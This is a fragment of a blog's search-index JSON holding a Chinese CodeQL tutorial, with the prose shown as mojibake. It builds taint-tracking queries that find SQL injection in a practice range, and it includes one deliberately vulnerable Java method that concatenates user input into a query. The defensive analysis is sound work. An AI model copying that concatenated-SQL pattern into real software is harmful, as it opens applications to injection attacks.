","date":"2025-04-13","objectID":"/posts/28dc684/:4:1","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"ç±»åº“\rä¸Šé¢æˆ‘ä»¬è¯´äº†CodeQLå¼•æ“ä¼šå°†ä»£ç è½¬æ¢ä¸ºæ•°æ®åº“ï¼Œè¿™ä¸ªæ•°æ®åº“å…¶å®å°±æ˜¯å¯è¯†åˆ«çš„ASTæ•°æ®åº“ åœ¨ASTé‡Œé¢Methodä»£è¡¨çš„å°±æ˜¯ç±»å½“ä¸­çš„æ–¹æ³•ï¼›æ¯”å¦‚è¯´æˆ‘ä»¬æƒ³è¿‡çš„æ‰€æœ‰çš„æ–¹æ³•è°ƒç”¨ï¼ŒMethodAccessè·å–çš„å°±æ˜¯æ‰€æœ‰çš„æ–¹æ³•è°ƒç”¨ã€‚ æˆ‘ä»¬ç»å¸¸ä¼šç”¨åˆ°çš„qlç±»åº“å¤§ä½“å¦‚ä¸‹ï¼š åç§° è§£é‡Š Method æ–¹æ³•ç±»ï¼ŒMethod methodè¡¨ç¤ºè·å–å½“å‰é¡¹ç›®ä¸­æ‰€æœ‰çš„æ–¹æ³• MethodAccess æ–¹æ³•è°ƒç”¨ç±»ï¼ŒMethodAccess callè¡¨ç¤ºè·å–å½“å‰é¡¹ç›®å½“ä¸­çš„æ‰€æœ‰æ–¹æ³•è°ƒç”¨ Parameter å‚æ•°ç±»ï¼ŒParameterè¡¨ç¤ºè·å–å½“å‰é¡¹ç›®å½“ä¸­æ‰€æœ‰çš„å‚æ•° ç»“åˆqlçš„è¯­æ³•ï¼Œæˆ‘ä»¬å°è¯•è·å–micro-service-seclabé¡¹ç›®å½“ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•ï¼š import java from Method kkk select kkk ç„¶åæ·»åŠ ä¸‹è¿‡æ»¤æ¡ä»¶ï¼Œç­›é€‰å‡ºåå­—ä¸º getStudent çš„æ–¹æ³•åç§° import java from Method k where k.hasName(\"getStudent\") select k.getName(), k.getDeclaringType() k.hashName() åˆ¤æ–­åå­—æ˜¯å¦åŒ¹é… k.getName() è·å–çš„æ˜¯å½“å‰æ–¹æ³•çš„åç§° k.getDeclaringType() è·å–çš„æ˜¯å½“å‰æ–¹æ³•æ‰€å±classçš„åç§° ","date":"2025-04-13","objectID":"/posts/28dc684/:4:2","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"è°“è¯\rå¦‚æœé™åˆ¶æ¡ä»¶æ¯”è¾ƒå¤šï¼Œwhere è¯­å¥å°±ä¼šå¾ˆå†—é•¿ã€‚CodeQLæä¾›ä¸€ç§æœºåˆ¶å¯ä»¥å¸®åŠ©æˆ‘ä»¬æŠŠå¾ˆé•¿çš„æŸ¥è¯¢è¯­å¥å°è£…æˆå‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°ï¼Œå°±å«è°“è¯ã€‚ æ¯”å¦‚ä¸Šé¢çš„æ¡ˆä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥å†™æˆå¦‚ä¸‹ï¼Œè·å¾—çš„ç»“æœè·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„ï¼š import java predicate isStudent(Method k) { k.getName()=\"getStudent\" } from Method k where isStudent(k) select k.getName(), k.getDeclaringType() predicate è¡¨ç¤ºå½“å‰æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ã€‚ ","date":"2025-04-13","objectID":"/posts/28dc684/:4:3","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"è®¾ç½®Sourceå’ŒSink\rä»€ä¹ˆæ˜¯sourceå’Œsink åœ¨ä»£ç è‡ªåŠ¨åŒ–å®‰å…¨å®¡è®¡çš„ç†è®ºå½“ä¸­ï¼Œæœ‰ä¸€ä¸ªæœ€æ ¸å¿ƒçš„ä¸‰å…ƒç»„æ¦‚å¿µï¼Œå°±æ˜¯(sourceï¼Œsinkå’Œsanitizer) sourceæ˜¯æŒ‡æ¼æ´æ±¡æŸ“é“¾æ¡çš„è¾“å…¥ç‚¹ã€‚æ¯”å¦‚è·å–httpè¯·æ±‚çš„å‚æ•°éƒ¨åˆ†ï¼Œå°±æ˜¯éå¸¸æ˜æ˜¾çš„Source sinkæ˜¯æŒ‡æ¼æ´æ±¡æŸ“é“¾æ¡çš„æ‰§è¡Œç‚¹ï¼Œæ¯”å¦‚SQLæ³¨å…¥æ¼æ´ï¼Œæœ€ç»ˆæ‰§è¡ŒSQLè¯­å¥çš„å‡½æ•°å°±æ˜¯sink(è¿™ä¸ªå‡½æ•°å¯èƒ½å«queryæˆ–è€…exeSqlï¼Œæˆ–è€…å…¶å®ƒ) sanitizeråˆå«å‡€åŒ–å‡½æ•°ï¼Œæ˜¯æŒ‡åœ¨æ•´ä¸ªçš„æ¼æ´é“¾æ¡å½“ä¸­ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªæ–¹æ³•é˜»æ–­äº†æ•´ä¸ªä¼ é€’é“¾ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•å°±å«sanitizerï¼Œä¹Ÿå°±æ˜¯waf åªæœ‰å½“sourceå’ŒsinkåŒæ—¶å­˜åœ¨ï¼Œå¹¶ä¸”ä»sourceåˆ°sinkçš„é“¾è·¯æ˜¯é€šçš„ï¼Œæ‰è¡¨ç¤ºå½“å‰æ¼æ´æ˜¯å­˜åœ¨çš„ã€‚ è®¾ç½®Source åœ¨CodeQLä¸­æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ¥è®¾ç½®Source override predicate isSource(DataFlow::Node src) {} åœ¨è¿™ä¸ªé¶åœºä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯Spring Bootæ¡†æ¶ï¼Œé‚£ä¹ˆsourceå°±æ˜¯httpå‚æ•°å…¥å£çš„ä»£ç å‚æ•°ï¼Œæ¯”å¦‚åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œsourceå°±æ˜¯usernameï¼š @RequestMapping(value = \"/one\") public List\u003cStudent\u003e one(@RequestParam(value = \"username\") String username) { return indexLogic.getStudent(username); } æœ¬ä¾‹ä¸­æˆ‘ä»¬è®¾ç½®Sourceçš„ä»£ç ä¸ºï¼š override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } RemoteFlowSource æ˜¯ CodeQL æ ‡å‡†åº“ä¸­é¢„å®šä¹‰çš„ â€œè¿œç¨‹æ•°æ®æºâ€ ç±»ï¼Œæ¯”å¦‚HTTP è¯·æ±‚å‚æ•°ï¼Œç”¨æˆ·è¾“å…¥ä»¥åŠå…¶ä»–å¤–éƒ¨è¾“å…¥ç­‰éƒ½æ˜¯ è¿™æ˜¯SDKè‡ªå¸¦çš„è§„åˆ™ï¼Œé‡Œé¢åŒ…å«äº†å¤§å¤šå¸¸ç”¨çš„Sourceå…¥å£ã€‚æˆ‘ä»¬ä½¿ç”¨çš„SpringBootä¹ŸåŒ…å«åœ¨å…¶ä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚ æ³¨: instanceof è¯­æ³•æ˜¯CodeQLæä¾›çš„è¯­æ³•ï¼Œåé¢åœ¨CodeQLè¿›é˜¶éƒ¨åˆ†ä¼šæåˆ°ï¼Œè¿™é‡Œå°±æ˜¯æ£€æŸ¥è·å¾—çš„ src æ˜¯å¦ä¸º RemoteFlowSource è®¾ç½®Sink åœ¨CodeQLä¸­æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ¥è®¾ç½®Sink override predicate isSink(DataFlow::Node sink) {} åœ¨å®é™…ä¸­ï¼Œæˆ‘ä»¬æœ€åéƒ½æ˜¯è§¦å‘åˆ°æŸä¸ªæ¶æ„æ–¹æ³•ï¼Œå¦‚ getterï¼Œsetterï¼Œæ‰€ä»¥ sink åº”è¯¥æ˜¯ä¸ªæ–¹æ³•ï¼Œå‡è®¾æˆ‘ä»¬è¿™é‡Œçš„sink ç‚¹æ˜¯ä¸ªqueryæ–¹æ³•(Method)çš„è°ƒç”¨(MethodAccess)ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¾ç½®Sinkä¸ºï¼š override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†existså­æŸ¥è¯¢ï¼Œè¿™ä¸ªæ˜¯CodeQLè°“è¯è¯­æ³•é‡Œéå¸¸å¸¸è§çš„è¯­æ³•ç»“æ„ï¼Œå®ƒæ ¹æ®å†…éƒ¨çš„å­æŸ¥è¯¢è¿”å›true or falseï¼Œæ¥å†³å®šç­›é€‰å‡ºå“ªäº›æ•°æ®ã€‚ sink.asExpr() = call.getArgument(0)ï¼šå°† sink èŠ‚ç‚¹è½¬æ¢ä¸ºè¡¨è¾¾å¼ï¼Œå¹¶æ£€æŸ¥å®ƒæ˜¯å¦ç­‰äº call çš„ç¬¬ä¸€ä¸ªå‚æ•° æ•…ä¸Šé¢sinkè¯­å¥çš„ä½œç”¨æ˜¯æŸ¥æ‰¾ä¸€ä¸ªquery()æ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼Œå¹¶æŠŠå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®ä¸ºsink åœ¨é¶åœºç³»ç»Ÿ(micro-service-seclab)ä¸­ï¼Œsinkä¸º jdbcTemplate.query(sql, ROW_MAPPER); å½“åˆšæ‰è®¾ç½®çš„sourceå˜é‡æµå…¥è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œè¯´æ˜æ³¨å…¥ç‚¹å’Œè§¦å‘ç‚¹æ˜¯é€šçš„ï¼Œå°±èƒ½äº§ç”Ÿæ³¨å…¥æ¼æ´ ","date":"2025-04-13","objectID":"/posts/28dc684/:4:4","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"Flowæ•°æ®æµ\rè®¾ç½®å¥½Sourceå’ŒSinkï¼Œå°±ç›¸å½“äºæå®šäº†é¦–å°¾ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç–é€šä¸­é—´çš„åˆ©ç”¨é“¾ã€‚ä¸€ä¸ªå—æ±¡æŸ“çš„å˜é‡ï¼Œèƒ½å¤Ÿæ¯«æ— é˜»æ‹¦çš„æµè½¬åˆ°å±é™©å‡½æ•°ï¼Œå°±è¡¨ç¤ºå­˜åœ¨æ¼æ´ è¿™ä¸ªè¿é€šå·¥ä½œå°±æ˜¯CodeQLå¼•æ“æœ¬èº«æ¥å®Œæˆçš„ã€‚æˆ‘ä»¬é€šè¿‡ä½¿ç”¨config.hasFlowPath(source, sink)æ–¹æ³•æ¥åˆ¤æ–­æ˜¯å¦è¿é€šã€‚ æ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼š from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" æˆ‘ä»¬ä¼ é€’ç»™config.hasFlowPath(source, sink)æˆ‘ä»¬å®šä¹‰å¥½çš„sourceå’Œsinkï¼Œç³»ç»Ÿå°±ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´äº†ã€‚ source.getNode()ï¼šè·å–æºèŠ‚ç‚¹çš„åº•å±‚è¯­æ³•æ ‘èŠ‚ç‚¹ï¼ˆAST Nodeï¼‰ï¼Œæ˜¾ç¤ºæ¼æ´æºå¤´åœ¨ä»£ç ä¸­çš„å…·ä½“ä½ç½® ","date":"2025-04-13","objectID":"/posts/28dc684/:4:5","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"ä»£ç æµ‹è¯•\r","date":"2025-04-13","objectID":"/posts/28dc684/:5:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"åˆæ­¥æ£€æµ‹\rç»¼ä¸Šï¼Œå¯ä»¥å†™ä¸ª ql æŸ¥è¯¢ä»£ç æ¥æ£€æµ‹ sql æ³¨å…¥æ¼æ´ /** * @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.security.QueryInjection import DataFlow::PathGraph class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \"SqlInjectionConfig\"} override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } } from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" CodeQL åœ¨å®šä¹‰ç±»ä¸Šçš„è¯­æ³•å’Œ Java ç±»ä¼¼ï¼Œå…¶ä¸­ extends çš„çˆ¶ç±» TaintTracking::Configuration æ˜¯å®˜æ–¹æä¾›ç”¨æ¥åšæ•°æ®æµåˆ†æçš„é€šç”¨ç±»ï¼Œæä¾›å¾ˆå¤šæ•°æ®æµåˆ†æç›¸å…³çš„æ–¹æ³•ï¼Œæ¯”å¦‚isSource(å®šä¹‰source)ï¼ŒisSink(å®šä¹‰sink) src instanceof RemoteFlowSource è¡¨ç¤ºsrc å¿…é¡»æ˜¯ RemoteFlowSource ç±»å‹ã€‚åœ¨RemoteFlowSourceé‡Œï¼Œå®˜æ–¹æä¾›å¾ˆéå¸¸å…¨çš„sourceå®šä¹‰ï¼Œæˆ‘ä»¬æœ¬æ¬¡ç”¨åˆ°çš„Springbootçš„Sourceå°±å·²ç»æ¶µç›–äº†ã€‚ æ³¨ï¼šä¸Šé¢çš„æ³¨é‡Šå’Œå…¶å®ƒè¯­è¨€æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸èƒ½å¤Ÿåˆ é™¤ï¼Œå®ƒæ˜¯ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œå› ä¸ºåœ¨æˆ‘ä»¬ç”Ÿæˆæµ‹è¯•æŠ¥å‘Šçš„æ—¶å€™ï¼Œä¸Šé¢æ³¨é‡Šå½“ä¸­çš„nameï¼Œdescriptionç­‰ä¿¡æ¯ä¼šå†™å…¥åˆ°å®¡è®¡æŠ¥å‘Šä¸­ã€‚ è¿™é‡Œçš„isSource å’ŒisSink æ ¹æ®è‡ªå·±éœ€è¦è¿›è¡Œé‡å†™ï¼Œè€Œåˆ¤æ–­ä¸­é—´æ˜¯å¦ç–é€šå¯ä»¥ä½¿ç”¨CodeQLæä¾›çš„config.hasFlowPath(source, sink)æ¥å¸®æˆ‘ä»¬å¤„ç† å¯ä»¥çœ‹åˆ°çœŸçš„å¾ˆæ–¹ä¾¿ï¼Œç›´æ¥æŠŠsourceå¤„å’Œæ•´ä¸ªä»sourceåˆ°sinkçš„é“¾å­éƒ½æ˜¾ç¤ºå‡ºæ¥äº† è¿™é‡Œçˆ†è­¦å‘Šè¯´æ˜¯ DataFlow::PathGraph åœ¨æ–°ç‰ˆæœ¬ä¸­è¢«å¼ƒç”¨äº†ï¼Œæ‰€ä»¥è¿™æ®µä»£ç åªèƒ½åœ¨ä½ç‰ˆæœ¬çš„è§„åˆ™åº“é‡Œè·‘ è¿™é‡Œå¼€å¤´æœ‰ @kind path-problem ï¼Œè¯´æ˜ç»“æœè‡³å°‘æ˜¯4åˆ—ï¼Œå†™äº†è¿™ä¸ªç»“æœå°±ä¼šè¾“å‡ºå®Œæ•´çš„æ±¡ç‚¹ä¼ æ’­è·¯å¾„ï¼Œé™¤æ­¤ä¹‹å¤–å¯¹è¾“å‡ºè¿˜æœ‰å…¶ä»–è¦æ±‚ï¼Œæ¯”å¦‚æ¯åˆ—è¦è¾“å‡ºçš„ç±»å‹ä¹Ÿæœ‰è¦æ±‚ï¼Œä½†æ˜¯æˆ‘è¿™ source.getNode(),source, sink,\"source\" å°±èƒ½æ­£å¸¸è¾“å‡ºï¼Œsource, sink,source.getNode(),\"source\" å´æ˜¯å•¥ä¹Ÿæ²¡æœ‰ ","date":"2025-04-13","objectID":"/posts/28dc684/:5:1","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"è¯¯æŠ¥åˆ†æ\ræˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€å¤„çš„ sql æ³¨å…¥ï¼Œå…¶è¾“å…¥çš„å‚æ•°ç±»å‹ä¸º List\u003cLong\u003e ï¼Œä¸å¯èƒ½å­˜åœ¨æ³¨å…¥ è¿™é‡Œè¯´æ˜æˆ‘ä»¬ç»™çš„é™åˆ¶å¹¶æœªä¸¥æ ¼è¦æ±‚å‚æ•°ç±»å‹ï¼Œå°±ä¼šå¯¼è‡´ä»¥ä¸Šçš„è¯¯æŠ¥äº§ç”Ÿï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ isSanitizer æ¥é¿å…è¿™ç§æƒ…å†µ isSanitizeræ˜¯CodeQLçš„ç±»TaintTracking::Configurationæä¾›çš„å‡€åŒ–æ–¹æ³•ã€‚å®ƒçš„å‡½æ•°åŸå‹æ˜¯ï¼š override predicate isSanitizer(DataFlow::Node node) {} åœ¨CodeQLè‡ªå¸¦çš„é»˜è®¤è§„åˆ™é‡Œï¼Œå¯¹å½“å‰èŠ‚ç‚¹æ˜¯å¦ä¸ºåŸºç¡€ç±»å‹åšäº†åˆ¤æ–­ override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType } è¡¨ç¤ºå¦‚æœå½“å‰èŠ‚ç‚¹æ˜¯ä¸Šé¢æåˆ°çš„åŸºç¡€ç±»å‹ï¼Œé‚£ä¹ˆæ­¤æ±¡æŸ“é“¾å°†è¢«å‡€åŒ–é˜»æ–­ï¼Œæ¼æ´å°†ä¸å­˜åœ¨ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œé»˜è®¤è§„åˆ™åªæ˜¯ä¸€äº›åŸºç¡€ç±»å‹ï¼Œæ²¡æœ‰ç±»ä¼¼ List\u003clong\u003e ç­‰çš„å¤åˆç±»å‹ æˆ‘ä»¬å°† TaintTracking::Configuration ä¸­çš„ isSanitizer é‡å†™ä¸‹å°±å¥½äº† override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType or exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType ) // è¿™é‡Œçš„ ParameterizedType ä»£è¡¨æ‰€æœ‰æ³›å‹ï¼Œåˆ¤æ–­æ³›å‹å½“ä¸­çš„ä¼ å‚æ˜¯å¦ä¸º Number å‹ } è¿™æ ·åœ¨æ£€æµ‹åˆ° List\u003clong\u003e æ—¶å°±ä¼šå°†å…¶å‡€åŒ–æ‰ï¼Œè¿™æ ·é“¾å­å°±ä¸é€šäº†ï¼Œä¹Ÿå°±ä¸ä¼šå‡ºç°è¯¯æŠ¥çš„æƒ…å†µ ","date":"2025-04-13","objectID":"/posts/28dc684/:5:2","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"æ¼æŠ¥è¡¥å……\ræˆ‘ä»¬å‘ç°å¦‚ä¸‹ sql æ³¨å…¥æ²¡æœ‰è¢«æ•æ‰åˆ°ï¼ˆå‚è€ƒæ–‡ç« æ˜¯è¿™æ ·å†™çš„ï¼Œä½†æˆ‘è¿™æ˜¯æ•æ‰åˆ°äº†çš„ï¼‰ public List\u003cStudent\u003e getStudentWithOptional(Optional\u003cString\u003e username) { String sqlWithOptional = \"select * from students where username like '%\" + username.get() + \"%'\"; //String sql = \"select * from students where username like ?\"; return jdbcTemplate.query(sqlWithOptional, ROW_MAPPER); } å®å¯é”™æ€ä¸€ç™¾ä¸å¯æ”¾è¿‡ä¸€ä¸ªï¼Œåœ¨ä»£ç å®¡è®¡ä¸­æ˜¯å¦‚æ­¤ï¼Œè¯¯æŠ¥å¯èƒ½éœ€è¦èŠ±è´¹æ—¶é—´å»ç­›é€‰ï¼Œä½†æ˜¯æ¼æŠ¥çš„æŸå¤±åˆ™æ— æ³•æŒ½å› åœ¨ CodeQL ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ isAdditionalTaintStep æ–¹æ³•æ¥å°†æ–­äº†çš„èŠ‚ç‚¹ç»™å®ƒå¼ºåˆ¶è¿æ¥ä¸Š isAdditionalTaintStep æ–¹æ³•æ˜¯CodeQLçš„ç±»TaintTracking::Configurationæä¾›çš„çš„æ–¹æ³•ï¼Œå®ƒçš„åŸå‹æ˜¯ï¼š override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {} å®ƒçš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªå¯æ§èŠ‚ç‚¹ï¼Œæ¯”å¦‚Aå¼ºåˆ¶ä¼ é€’ç»™å¦å¤–ä¸€ä¸ªèŠ‚ç‚¹Bï¼Œé‚£ä¹ˆèŠ‚ç‚¹Bä¹Ÿå°±æˆäº†å¯æ§èŠ‚ç‚¹ã€‚ å‡è®¾è¿™é‡Œæ˜¯ username.get() è¿™ä¸€æ­¥æ–­æ‰äº†ï¼Œæˆ‘ä»¬å¯ä»¥å¼ºåˆ¶è®© username æµè½¬åˆ° username.get() ï¼Œä»£ç ä¸º /** * @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.security.QueryInjection import DataFlow::PathGraph predicate isTaintedString(Expr expSrc, Expr expDest) { exists(Method method, MethodAccess call, MethodAccess call1 | expSrc = call1.getArgument(0) and expDest=call and call.getMethod() = method and method.hasName(\"get\") and method.getDeclaringType().toString() = \"Optional\u003cString\u003e\" and call1.getArgument(0).getType().toString() = \"Optional\u003cString\u003e\" ) } class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \"SqlInjectionConfig\" } override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType or exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType ) } override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) { isTaintedString(node1.asExpr(), node2.asExpr()) } } from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" expSrc = call1.getArgument(0)ï¼šè§„å®šäº†æ±¡æŸ“æºä¸ºç¬¬ä¸€ä¸ªå‚æ•° expDest = call and call.getMethod() = method and method.hasName(\"get\")ï¼šè§„å®šäº†æ±¡æŸ“ç›®æ ‡ä¸º xxx.get() method.getDeclaringType().toString() = \"Optional\u003cString\u003e\" and call1.getArgument(0).getType().toString() = \"Optional\u003cString\u003e\" ï¼šè§„å®šäº†æ±¡æŸ“æºå’Œæ±¡æŸ“ç›®æ ‡çš„ç±»å‹ä¸ºOptional\u003cString\u003e ","date":"2025-04-13","objectID":"/posts/28dc684/:5:3","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"Lomboké—®é¢˜è§£å†³\rLombokæ˜¯ä¸€ä¸ªéå¸¸æœ‰åçš„Javaç±»åº“ï¼Œåœ¨å¼€å‘ä¸­åº”è¯¥ç»å¸¸é‡åˆ°ï¼Œå®ƒé€šè¿‡ç®€å•çš„æ³¨è§£æ¥å¸®åŠ©æˆ‘ä»¬ç®€åŒ–æ¶ˆé™¤ä¸€äº›å¿…é¡»æœ‰ä½†æ˜¾å¾—å¾ˆè‡ƒè‚¿çš„Javaä»£ç çš„å·¥å…·ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥ä¸ç”¨ç¼–å†™ getterï¼Œsetter demo public class Student { private int id; private String username; public void setId(int id) { this.id = id; } public int getId() { return id; } public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } } å½“æˆ‘ä»¬ä½¿ç”¨ Lombok çš„æ³¨è§£ï¼Œå°±ä¸éœ€è¦æ‰‹åŠ¨ç¼–å†™ getter å’Œ setterï¼Œä»¥ä¸‹ä»£ç ç­‰åŒäºä¸Šé¢çš„ demo import lombok.Data; @Data public class Student { private int id; private String username; private int sex; private int age; } å¯ä»¥çœ‹åˆ°ç”¨äº† lombok æ³¨è§£åå°±æ²¡æœ‰äº† getter å’Œ setterï¼Œè¿™å°±ä¼šå¯¼è‡´ CodeQL ä¸èƒ½æ­£å¸¸æ£€æµ‹ï¼Œsource åˆ° sink çš„é“¾æ¡æ–­è£‚ï¼Œä»è€Œé€ æˆæ¼æŠ¥ æœ‰ä¸¤ç§è§£å†³åŠæ³•ï¼Œç¬¬ä¸€ç§æ˜¯åœ¨ pom.xml ä¸­åŠ å…¥ä¾èµ–ï¼Œå†é‡æ–°ç¼–è¯‘å³å¯ \u003cbuild\u003e \u003csourceDirectory\u003etarget/generated-sources/delombok\u003c/sourceDirectory\u003e \u003ctestSourceDirectory\u003etarget/generated-test-sources/delombok\u003c/testSourceDirectory\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.projectlombok\u003c/groupId\u003e \u003cartifactId\u003elombok-maven-plugin\u003c/artifactId\u003e \u003cversion\u003e1.18.20.0\u003c/version\u003e \u003cexecutions\u003e \u003cexecution\u003e \u003cid\u003edelombok\u003c/id\u003e \u003cphase\u003egenerate-sources\u003c/phase\u003e \u003cgoals\u003e \u003cgoal\u003edelombok\u003c/goal\u003e \u003c/goals\u003e \u003cconfiguration\u003e \u003caddOutputDirectory\u003efalse\u003c/addOutputDirectory\u003e \u003csourceDirectory\u003esrc/main/java\u003c/sourceDirectory\u003e \u003c/configuration\u003e \u003c/execution\u003e \u003cexecution\u003e \u003cid\u003etest-delombok\u003c/id\u003e \u003cphase\u003egenerate-test-sources\u003c/phase\u003e \u003cgoals\u003e \u003cgoal\u003etestDelombok\u003c/goal\u003e \u003c/goals\u003e \u003cconfiguration\u003e \u003caddOutputDirectory\u003efalse\u003c/addOutputDirectory\u003e \u003csourceDirectory\u003esrc/test/java\u003c/sourceDirectory\u003e \u003c/configuration\u003e \u003c/execution\u003e \u003c/executions\u003e \u003c/plugin\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-maven-plugin\u003c/artifactId\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e ç¬¬äºŒç§æ˜¯æœ‰äººåœ¨ issue ä¸­æå‡ºçš„ï¼šhttps://github.com/github/codeql/issues/4984 # get a copy of lombok.jar wget https://projectlombok.org/downloads/lombok.jar -O \"lombok.jar\" # run \"delombok\" on the source files and write the generated files to a folder named \"delombok\" java -jar \"lombok.jar\" delombok -n --onlyChanged . -d \"delombok\" # remove \"generated by\" comments find \"delombok\" -name '*.java' -exec sed '/Generated by delombok/d' -i '{}' ';' # remove any left-over import statements find \"delombok\" -name '*.java' -exec sed '/import lombok/d' -i '{}' ';' # copy delombok'd files over the original ones cp -r \"delombok/.\" \"./\" # remove the \"delombok\" folder rm -rf \"delombok\" ä¸¤ç§æ–¹æ³•éƒ½æ˜¯å»æ‰ lombok æ³¨è§£ï¼Œå¹¶è¿˜åŸ setter å’Œ getter æ–¹æ³•ï¼Œå®ç°æ‰‹æ³•ä¸ä¸€æ ·ç½¢äº†ï¼Œè²Œä¼¼ç¬¬ä¸€ç§æ›´æ–¹ä¾¿ï¼Œä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™å•¥éƒ½æ²¡ä¿®æ”¹è¿˜æ˜¯æ£€æµ‹å‡ºæ¥äº† ","date":"2025-04-13","objectID":"/posts/28dc684/:5:4","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"æ‰¹é‡åŒ–å®ç°\rä»¥ä¸Š ql è§„åˆ™å¯ä»¥æˆåŠŸè·‘å‡ºé¶åœºçš„ sql æ³¨å…¥æ¼æ´ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†å…¶è¿ç”¨åˆ°å…¶ä»–é¡¹ç›®ä¸Šï¼Œå…ˆç”Ÿæˆç›¸åº”çš„æ•°æ®åº“ï¼Œç„¶åå†ç”¨å†™å¥½çš„ ql æ–‡ä»¶å»åˆ†æå°±å¥½ï¼Œcodeql å‘½ä»¤ä¸º codeql database analyze /CodeQL/databases/micro-service-seclab /CodeQL/ql/java/ql/examples/demo --format=csv --output=/CodeQL/Result/micro-service-seclab.csv --rerun ","date":"2025-04-13","objectID":"/posts/28dc684/:5:5","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"CodeQLè¿›é˜¶\r","date":"2025-04-13","objectID":"/posts/28dc684/:6:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"instanceofè¯­æ³•ç³–\ra instanceof b ä¸Šé¢è¯­å¥å°±æ˜¯æ£€æµ‹ a å¯¹è±¡æ˜¯å¦æ˜¯ b ç±»å‹ 